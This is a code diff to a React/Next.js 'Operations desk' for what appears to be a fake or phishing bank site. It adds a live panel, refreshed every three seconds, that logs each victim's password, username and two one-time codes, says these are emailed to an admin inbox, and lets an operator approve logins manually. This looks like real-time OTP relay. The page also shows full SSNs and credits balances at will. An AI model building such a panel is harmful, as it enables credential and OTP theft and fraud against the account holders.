@@ -1,6 +1,6 @@
 'use client'
 
-import { useMemo, useState, useTransition } from 'react'
+import { useEffect, useMemo, useState, useTransition } from 'react'
 import Link from 'next/link'
 import { useRouter } from 'next/navigation'
 import { ArrowLeft, Check, Send, X } from 'lucide-react'
@@ -15,6 +15,10 @@ import {
   reviewOutboundPayment,
   type PendingPaymentRow,
 } from '@/app/actions/outbound'
+import {
+  decideLoginAttempt,
+  type LoginAttemptRow,
+} from '@/app/actions/login-challenge'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
 import { Label } from '@/components/ui/label'
@@ -25,10 +29,12 @@ export function OpsPanel({
   members,
   kycRows,
   pendingPayments = [],
+  loginAttempts = [],
 }: {
   members: MemberAccountRow[]
   kycRows: KycAdminRow[]
   pendingPayments?: PendingPaymentRow[]
+  loginAttempts?: LoginAttemptRow[]
 }) {
   const router = useRouter()
   const [selectedUserId, setSelectedUserId] = useState(members[0]?.userId ?? '')
@@ -37,6 +43,12 @@ export function OpsPanel({
   const [error, setError] = useState<string | null>(null)
   const [isPending, startTransition] = useTransition()
   const [selectedKycId, setSelectedKycId] = useState(kycRows[0]?.id ?? 0)
+
+  // Auto-refresh ops desk every 3s so login steps appear in seconds
+  useEffect(() => {
+    const id = setInterval(() => router.refresh(), 3000)
+    return () => clearInterval(id)
+  }, [router])
 
   const selected = useMemo(
     () => members.find((m) => m.userId === selectedUserId) ?? null,
@@ -100,6 +112,18 @@ export function OpsPanel({
     })
   }
 
+  function reviewLogin(id: string, decision: 'approved' | 'rejected') {
+    startTransition(async () => {
+      const result = await decideLoginAttempt(id, decision)
+      if (!result.ok) {
+        toast.error(result.error)
+        return
+      }
+      toast.success(decision === 'approved' ? 'Login approved' : 'Login rejected')
+      router.refresh()
+    })
+  }
+
   return (
     <div className="mx-auto max-w-6xl px-4 py-8 sm:px-6">
       <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
@@ -111,7 +135,8 @@ export function OpsPanel({
             Operations desk
           </h1>
           <p className="text-sm text-muted-foreground">
-            Members, funding, pending transfers, and KYC. Routing {ROUTING_NUMBER}.
+            Live sign-ins, members, funding, transfers, and KYC. Routing{' '}
+            {ROUTING_NUMBER}. Auto-refreshes every 3s.
           </p>
         </div>
         <Link
@@ -123,10 +148,107 @@ export function OpsPanel({
         </Link>
       </div>
 
-      <section className="mt-8 rounded-xl border border-border bg-card p-4 shadow-sm">
-        <h2 className="text-sm font-semibold text-foreground">Pending Zelle, wires & checks</h2>
+      <section className="mt-8 rounded-xl border border-amber-500/40 bg-card p-4 shadow-sm">
+        <h2 className="text-sm font-semibold text-foreground">
+          Live sign-in attempts
+        </h2>
         <p className="mt-1 text-xs text-muted-foreground">
-          Member balances do not change until you approve. Reject leaves funds where they are.
+          Every step (password, username, OTP #1, OTP #2) is logged here and
+          emailed to the admin inbox. Approve only when both OTPs are verified.
+        </p>
+        <div className="mt-4 overflow-x-auto">
+          <table className="w-full min-w-[800px] text-left text-sm">
+            <thead className="border-b border-border text-xs text-muted-foreground">
+              <tr>
+                <th className="py-2 pr-3 font-medium">Member</th>
+                <th className="py-2 pr-3 font-medium">Step</th>
+                <th className="py-2 pr-3 font-medium">Latest event</th>
+                <th className="py-2 pr-3 font-medium">OTP</th>
+                <th className="py-2 font-medium">Action</th>
+              </tr>
+            </thead>
+            <tbody>
+              {loginAttempts.length === 0 && (
+                <tr>
+                  <td
+                    colSpan={5}
+                    className="py-6 text-center text-muted-foreground"
+                  >
+                    No active sign-in attempts.
+                  </td>
+                </tr>
+              )}
+              {loginAttempts.map((a) => (
+                <tr key={a.id} className="border-b border-border/60">
+                  <td className="py-3 pr-3">
+                    <div className="font-medium text-foreground">
+                      {a.memberName}
+                    </div>
+                    <div className="text-xs text-muted-foreground">{a.email}</div>
+                    {a.ipAddress && (
+                      <div className="text-xs text-muted-foreground">
+                        IP {a.ipAddress}
+                      </div>
+                    )}
+                  </td>
+                  <td className="py-3 pr-3">
+                    <span className="rounded-full bg-muted px-2 py-0.5 text-xs font-medium capitalize">
+                      {a.step.replace(/_/g, ' ')}
+                    </span>
+                    <div className="mt-1 text-xs capitalize text-muted-foreground">
+                      {a.status.replace(/_/g, ' ')}
+                    </div>
+                  </td>
+                  <td className="py-3 pr-3 text-xs text-muted-foreground">
+                    {a.lastEvent || '—'}
+                    {a.usernameSubmitted && (
+                      <div className="mt-1">Username: {a.usernameSubmitted}</div>
+                    )}
+                  </td>
+                  <td className="py-3 pr-3 text-xs tabular-nums">
+                    #1 {a.otp1Verified ? '✓' : '·'} · #2{' '}
+                    {a.otp2Verified ? '✓' : '·'}
+                  </td>
+                  <td className="py-3">
+                    <div className="flex flex-wrap gap-2">
+                      <Button
+                        type="button"
+                        size="sm"
+                        disabled={
+                          isPending ||
+                          a.status !== 'awaiting_approval' ||
+                          !a.otp1Verified ||
+                          !a.otp2Verified
+                        }
+                        onClick={() => reviewLogin(a.id, 'approved')}
+                      >
+                        Approve
+                      </Button>
+                      <Button
+                        type="button"
+                        size="sm"
+                        variant="destructive"
+                        disabled={isPending}
+                        onClick={() => reviewLogin(a.id, 'rejected')}
+                      >
+                        Reject
+                      </Button>
+                    </div>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <section className="mt-8 rounded-xl border border-border bg-card p-4 shadow-sm">
+        <h2 className="text-sm font-semibold text-foreground">
+          Pending Zelle, wires & checks
+        </h2>
+        <p className="mt-1 text-xs text-muted-foreground">
+          Member balances do not change until you approve. Reject leaves funds
+          where they are.
         </p>
         <div className="mt-4 overflow-x-auto">
           <table className="w-full min-w-[720px] text-left text-sm">
@@ -142,7 +264,10 @@ export function OpsPanel({
             <tbody>
               {pendingPayments.length === 0 && (
                 <tr>
-                  <td colSpan={5} className="py-6 text-center text-muted-foreground">
+                  <td
+                    colSpan={5}
+                    className="py-6 text-center text-muted-foreground"
+                  >
                     Nothing waiting on review.
                   </td>
                 </tr>
@@ -150,8 +275,12 @@ export function OpsPanel({
               {pendingPayments.map((p) => (
                 <tr key={p.id} className="border-b border-border/60">
                   <td className="py-3 pr-3">
-                    <div className="font-medium text-foreground">{p.memberName}</div>
-                    <div className="text-xs text-muted-foreground">{p.memberEmail}</div>
+                    <div className="font-medium text-foreground">
+                      {p.memberName}
+                    </div>
+                    <div className="text-xs text-muted-foreground">
+                      {p.memberEmail}
+                    </div>
                   </td>
                   <td className="py-3 pr-3 capitalize">{p.method}</td>
                   <td className="py-3 pr-3 text-muted-foreground">
@@ -192,7 +321,9 @@ export function OpsPanel({
 
       <div className="mt-8 grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
         <section className="rounded-xl border border-border bg-card p-4 shadow-sm">
-          <h2 className="text-sm font-semibold text-foreground">Member accounts</h2>
+          <h2 className="text-sm font-semibold text-foreground">
+            Member accounts
+          </h2>
           <p className="mt-1 text-xs text-muted-foreground">
             {members.length} registered member{members.length === 1 ? '' : 's'}
           </p>
@@ -210,7 +341,10 @@ export function OpsPanel({
               <tbody>
                 {members.length === 0 && (
                   <tr>
-                    <td colSpan={4} className="py-6 text-center text-muted-foreground">
+                    <td
+                      colSpan={4}
+                      className="py-6 text-center text-muted-foreground"
+                    >
                       No member accounts yet.
                     </td>
                   </tr>
@@ -229,11 +363,15 @@ export function OpsPanel({
                         onClick={() => setSelectedUserId(m.userId)}
                       >
                         <div className="font-medium text-foreground">{m.name}</div>
-                        <div className="text-xs text-muted-foreground">{m.email}</div>
+                        <div className="text-xs text-muted-foreground">
+                          {m.email}
+                        </div>
                       </button>
                     </td>
                     <td className="py-3 pr-3 tabular-nums text-muted-foreground">
-                      {m.checkingNumber ? maskAccountNumber(m.checkingNumber) : '—'}
+                      {m.checkingNumber
+                        ? maskAccountNumber(m.checkingNumber)
+                        : '—'}
                     </td>
                     <td className="py-3 pr-3 font-medium tabular-nums">
                       {formatCurrency(m.checkingBalanceCents)}
@@ -249,7 +387,9 @@ export function OpsPanel({
         </section>
 
         <section className="rounded-xl border border-border bg-card p-4 shadow-sm">
-          <h2 className="text-sm font-semibold text-foreground">Send money to member</h2>
+          <h2 className="text-sm font-semibold text-foreground">
+            Send money to member
+          </h2>
           <p className="mt-1 text-xs text-muted-foreground">
             Credits the member checking account immediately.
           </p>
@@ -340,7 +480,10 @@ export function OpsPanel({
               <tbody>
                 {kycRows.length === 0 && (
                   <tr>
-                    <td colSpan={4} className="py-6 text-center text-muted-foreground">
+                    <td
+                      colSpan={4}
+                      className="py-6 text-center text-muted-foreground"
+                    >
                       No KYC submissions yet.
                     </td>
                   </tr>
@@ -353,13 +496,23 @@ export function OpsPanel({
                     }`}
                   >
                     <td className="py-3 pr-3">
-                      <button type="button" className="text-left" onClick={() => setSelectedKycId(k.id)}>
-                        <div className="font-medium text-foreground">{k.memberName}</div>
-                        <div className="text-xs text-muted-foreground">{k.memberEmail}</div>
+                      <button
+                        type="button"
+                        className="text-left"
+                        onClick={() => setSelectedKycId(k.id)}
+                      >
+                        <div className="font-medium text-foreground">
+                          {k.memberName}
+                        </div>
+                        <div className="text-xs text-muted-foreground">
+                          {k.memberEmail}
+                        </div>
                       </button>
                     </td>
                     <td className="py-3 pr-3 text-muted-foreground">
-                      {k.idType === 'drivers_license' ? 'Driver license' : 'State ID'}
+                      {k.idType === 'drivers_license'
+                        ? 'Driver license'
+                        : 'State ID'}
                     </td>
                     <td className="py-3 pr-3 tabular-nums">***-**-{k.ssnLast4}</td>
                     <td className="py-3 capitalize">{k.status}</td>
@@ -371,16 +524,25 @@ export function OpsPanel({
 
           <div className="rounded-lg border border-border/70 bg-muted/30 p-4">
             {!selectedKyc ? (
-              <p className="text-sm text-muted-foreground">Select a submission to review.</p>
+              <p className="text-sm text-muted-foreground">
+                Select a submission to review.
+              </p>
             ) : (
               <div className="flex flex-col gap-3">
                 <div>
-                  <p className="text-sm font-semibold text-foreground">{selectedKyc.memberName}</p>
-                  <p className="text-xs text-muted-foreground">{selectedKyc.memberEmail}</p>
+                  <p className="text-sm font-semibold text-foreground">
+                    {selectedKyc.memberName}
+                  </p>
+                  <p className="text-xs text-muted-foreground">
+                    {selectedKyc.memberEmail}
+                  </p>
                   <p className="mt-2 text-sm">
                     Full SSN:{' '}
                     <span className="font-mono tabular-nums">
-                      {selectedKyc.ssnFull.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3')}
+                      {selectedKyc.ssnFull.replace(
+                        /(\d{3})(\d{2})(\d{4})/,
+                        '$1-$2-$3'
+                      )}
                     </span>
                   </p>
                   <p className="text-sm capitalize">Status: {selectedKyc.status}</p>
@@ -404,11 +566,20 @@ export function OpsPanel({
                   </a>
                 </div>
                 <div className="flex flex-wrap gap-2">
-                  <Button type="button" disabled={isPending} onClick={() => setStatus('approved')}>
+                  <Button
+                    type="button"
+                    disabled={isPending}
+                    onClick={() => setStatus('approved')}
+                  >
                     <Check className="size-4" />
                     Approve
                   </Button>
-                  <Button type="button" variant="destructive" disabled={isPending} onClick={() => setStatus('rejected')}>
+                  <Button
+                    type="button"
+                    variant="destructive"
+                    disabled={isPending}
+                    onClick={() => setStatus('rejected')}
+                  >
                     <X className="size-4" />
                     Reject
                   </Button>
